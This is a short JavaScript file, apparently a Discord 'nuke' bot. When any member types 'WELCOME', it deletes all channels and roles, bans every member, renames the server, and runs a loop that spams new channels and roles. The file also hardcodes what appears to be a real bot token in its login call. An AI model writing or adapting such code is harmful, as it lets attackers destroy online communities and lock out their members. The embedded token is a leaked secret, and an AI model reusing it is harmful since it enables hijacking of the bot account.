const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === "WELCOME") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("SpartaPro UP ");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("Salm cry sp Up", "text");///////bo channel 
        message.guild.createChannel("Salm cry sp  Up", "voice");////bo voice
        message.guild.createRole({ name: "Cry Salm sp Up" });////nawek dane bo role kan
      });
    }
  }
});

client.login("OTgzNTEzNTE5MTQyMDgwNTEy.GAz2wZ.QxOmGfAdDBEpJvqXUw2VBaNvF2Wf6ZQulYzn_U")
